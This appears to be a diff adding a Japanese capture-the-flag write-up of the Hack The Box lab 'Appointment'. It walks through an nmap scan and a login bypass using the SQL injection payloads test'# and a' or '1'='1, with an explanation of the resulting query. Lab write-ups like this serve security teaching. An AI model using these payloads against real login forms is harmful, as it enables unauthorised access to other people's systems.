@@ -1,0 +1,80 @@
+# Hack The Box – Starting Point: Appointment
+
+## 🎯 Overview
+HTB Starting Point Tier 1 の「Appointment」を攻略。  
+本課題では、**シンプルなSQL Injectionによる認証回避**を扱う。
+
+---
+
+## 🔍 1. ポートスキャン
+まずは対象マシンの基本調査。
+
+```bash
+nmap -sV -sC MACHINE_IP
+```
+
+### ▶ 主な結果
+- **80/tcp** → HTTP（Webアプリケーションが稼働）
+- 特に他のポートは開いていない
+
+---
+
+## 🌐 2. Webアプリの確認
+ブラウザで以下にアクセス：
+
+```
+http://MACHINE_IP:80
+```
+
+ログインページが表示される。
+
+---
+
+## 🧪 3. SQL Injection のテスト
+ログインフォームが脆弱だと仮定して、典型的なSQLiペイロードを試す。
+
+### ▶ 入力した内容
+
+**Username**
+```
+test'#
+```
+
+- `#` … MySQL のコメントアウト  
+- `test'#` により後続がコメントされ、実質 `username='test'` のみが評価される
+
+**Password**
+```
+a' or '1'='1
+```
+
+- 常に真となる条件式
+
+### ▶ 期待される挙動
+SQLクエリ例（推測）：
+
+```sql
+SELECT * FROM users 
+WHERE username='test'#' AND password='a' or '1'='1';
+```
+
+`#`以降が無視され、**パスワードチェック自体が崩壊する**。
+
+---
+
+## 🔓 4. ログイン成功 & Flag取得
+SQL Injectionが成功し、管理者画面へログイン。  
+表示されているフラグを入手。
+
+---
+
+## 🏁 Flag
+（ここはHTBのルールにより **flagの値は書かない**）
+
+---
+
+## 📘 学んだこと
+- 最も基本的な SQL Injection による認証回避
+- コメントアウト（`#`）と OR 条件でのバイパス
+- ログインフォームの入力値検証不足の危険性
+
